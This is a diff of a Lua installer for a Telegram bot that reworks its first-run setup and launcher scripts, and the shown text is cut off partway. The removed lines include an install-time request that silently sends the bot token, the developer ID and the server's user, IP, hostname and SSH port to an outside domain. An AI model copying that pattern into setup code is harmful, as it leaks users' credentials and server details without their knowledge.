@@ -1,56 +1,20 @@
-redis    = require('redis') 
-https    = require ("ssl.https") 
-serpent  = dofile("./library/serpent.lua") 
-json     = dofile("./library/JSON.lua") 
-JSON     = dofile("./library/dkjson.lua")
-URL      = require('socket.url')  
-utf8     = require ('lua-utf8') 
+redis = require('redis') 
+https = require ("ssl.https") 
+serpent = dofile("./library/serpent.lua") 
+json = dofile("./library/JSON.lua") 
+JSON  = dofile("./library/dkjson.lua")
+URL = require('socket.url')  
+utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
-Server   = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-User     = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
-Ip       = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
-Name     = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
-Port     = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
+id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
+Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
+Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
+Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
+whoami = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 --------------------------------------------------------------------------------------------------------------
-local AutoFiles_Write = function() 
-if not database:get(Server.."Token_Write") then
-print("\27[1;34m»» ارسل توكن البوت الخاص بك الان :\27[m")
-local token = io.read()
-if token ~= '' then
-local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
-if res ~= 200 then
-io.write('\n\27[1;31mعذراً التوكن غير صحيح تأكد منه ثم ارسله \n\27[0;39;49m')
-else
-io.write('\n\27[1;31mتم حفظ التوكن\n\27[0;39;49m')
-database:set(Server.."Token_Write",token)
-end 
-else
-io.write('\n\27[1;31mلم يتم حفظ التوكن\n\27[0;39;49m')
-end 
-os.execute('lua Engineer.lua')
-end
-if not database:get(Server.."UserSudo_Write") then
-print("\27[1;34mارسل ايدي المطور الان :\27[m")
-local Id = io.read():gsub(' ','') 
-if tostring(Id):match('%d+') then
-data,res = https.request("https://api-watan.ml/WaTaN/index.php?Ban=Engineer&Info&Id="..Id)
-if res == 200 then
-Abs = json:decode(data)
-if Abs.Result.Info == 'Is_Spam' then
-io.write('\n\27[1;31mعذرا هذا الايدي محظور من السورس\n\27[0;39;49m')
-os.execute('lua Engineer.lua')
-end ---ifBn
-if Abs.Result.Info == 'Ok' then
-io.write('\n\27[1;31m The Id Is Saved\n\27[0;39;49m')
-database:set(Server.."UserSudo_Write",Id)
-end ---ifok
-else
-io.write('\n\27[1;31mThe Id was not Saved\n\27[0;39;49m')
-end  ---ifid
-os.execute('lua Engineer.lua')
-end ---ifnot
-end
-local Create = function(data, file, uglify)  
+local AutoSet = function() 
+local create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
 if not uglify then  
@@ -58,69 +22,145 @@ serialized = serpent.block(data, {comment = false, name = "Info"})
 else  
 serialized = serpent.dump(data)  
 end    
-file:write(serialized)
+file:write(serialized)    
 file:close()  
+end  
+if not database:get(id_server..":token") then
+io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27')
+local token = io.read()
+if token ~= '' then
+local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
+if res ~= 200 then
+print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسله')
+else
+io.write('\27[0;31m تم حفظ التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
+local json = JSON.decode(url)
+database:set(id_server..":token_username","@"..json.result.username)
+database:set(id_server..":token",token)
+end 
+else
+print('\27[0;35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
+end 
+os.execute('lua WaTaN.lua')
 end
-local function Files_Info_Get()
-Config = {
-token = database:get(Server.."Token_Write"),
-SUDO = database:get(Server.."UserSudo_Write"),
-}
-Create(Config, "./Info.lua") 
-https.request("https://api-watan.ml/WaTaN/index.php?Get=Engineer&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
-print("::Engineer::")
-local RunEngineer = io.open("Engineer", 'w')
-RunEngineer:write([[
+if not database:get(id_server..":SUDO:ID") then 
+io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m') 
+local SUDOID = io.read() 
+if SUDOID ~= '' then 
+io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m') 
+database:set(id_server..":SUDO:ID",SUDOID) 
+else 
+print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره') 
+end  
+os.execute('lua WaTaN.lua') 
+end
+if not database:get(id_server..":SUDO:USERNAME") then
+io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
+local SUDOUSERNAME = io.read():gsub('@','')
+if SUDOUSERNAME ~= '' then
+io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
+database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
+else
+print('\n\27[1;34m لم يتم حفظ معرف المطور :')
+end 
+os.execute('lua WaTaN.lua')
+end
+local create_config_auto = function()
+config = {
+token = database:get(id_server..":token"),
+SUDO = database:get(id_server..":SUDO:ID"),
+UserName = database:get(id_server..":SUDO:USERNAME"),
+ }
+create(config, "./Info.lua")   
+end 
+create_config_auto()
+token = database:get(id_server..":token")
+SUDO = database:get(id_server..":SUDO:ID")
+install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
+file = io.open("WaTaN", "w")  
+file:write([[
 #!/usr/bin/env bash
-cd $HOME/Engineer
-token="]]..database:get(Server.."Token_Write")..[["
+cd $HOME/WaTaN
+token="]]..database:get(id_server..":token")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
 echo "TG IS NOT FIND IN FILES BOT"
 echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 exit 1
 fi
 if [ ! $token ]; then
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
-echo "TOKEN IS NOT FIND IN FILE INFO.LUA"
-echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE INFO.LUA \e[0m"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
 exit 1
 fi
-./tg -s ./Engineer.lua -p PROFILE --bot=$token
+echo -e "\033[38;5;208m"
+echo -e "                                                  "
+echo -e "\033[0;00m"
+echo -e "\e[36m"
+./tg -s ./WaTaN.lua -p PROFILE --bot=$token
 done
-]])
-RunEngineer:close()
-local RunWtN = io.open("WtN", 'w')
-RunWtN:write([[
+]])  
+file:close()  
+file = io.open("WtN", "w")  
+file:write([[
 #!/usr/bin/env bash
-cd $HOME/Engineer
+cd $HOME/WaTaN
 while(true) do
 rm -fr ../.telegram-cli
-screen -S Engineer -X kill
-screen -S Engineer ./Engineer
+screen -S WaTaN -X kill
+screen -S WaTaN ./WaTaN
 done
-]])
-RunWtN:close()
-io.popen("mkdir File_Bot") 
-os.execute('chmod +x Engineer;sudo chmod +x ./WtN;./WtN')
-end
-Files_Info_Get()
+]])  
+file:close() 
+os.execute('rm -fr $HOME/.telegram-cli')
 end 
-local function Load_File()  
+local serialize_to_file = function(data, file, uglify)  
+file = io.open(file, "w+")  
+local serialized  
+if not uglify then   
+serialized = serpent.block(data, {comment = false, name = "Info"})  
+else   
+serialized = serpent.dump(data) 
+end  
+file:write(serialized)  
+file:close() 
+end 
+local load_redis = function()  
 local f = io.open("./Info.lua", "r")  
 if not f then   
-AutoFiles_Write()  
-var = true
+AutoSet()  
 else   
 f:close()  
-database:del(Server.."Token_Write");database:del(Server.."UserSudo_Write")
-var = false
+database:del(id_server..":token")
+database:del(id_server..":SUDO:ID")
 end  
-return var
-end
-Load_File() 
+local config = loadfile("./Info.lua")() 
+return config 
+end 
+_redis = load_redis() 
+--------------------------------------------------------------------------------------------------------------
+print([[
+╔╗╔╗╔╗     ╔════╗     ╔═╗ ╔╗
+║║║║║║     ║╔╗╔╗║     ║║╚╗║║
+║║║║║║╔══╗ ╚╝║║╚╝╔══╗ ║╔╗╚╝║
+║╚╝╚╝║╚ ╗║   ║║  ╚ ╗║ ║║╚╗║║
+╚╗╔╗╔╝║╚╝╚╗ ╔╝╚╗ ║╚╝╚╗║║ ║║║
+ ╚╝╚╝ ╚═══╝ ╚══╝ ╚═══╝╚╝ ╚═╝
+                               
+> CH › @WaTaNTeaM
+> CH › @WaTaNTeaM
+~> DEVELOPER › @abbasfadhil
+]])
+sudos = dofile("./Info.lua") 
+SUDO = tonumber(sudos.SUDO)
+sudo_users = {SUDO}
+bot_id = sudos.token:match("(%d+)")  
+token = sudos.token 
+--- start functions ↓
 --------------------------------------------------------------------------------------------------------------
 print([[     
 > CH › @EngineerSource
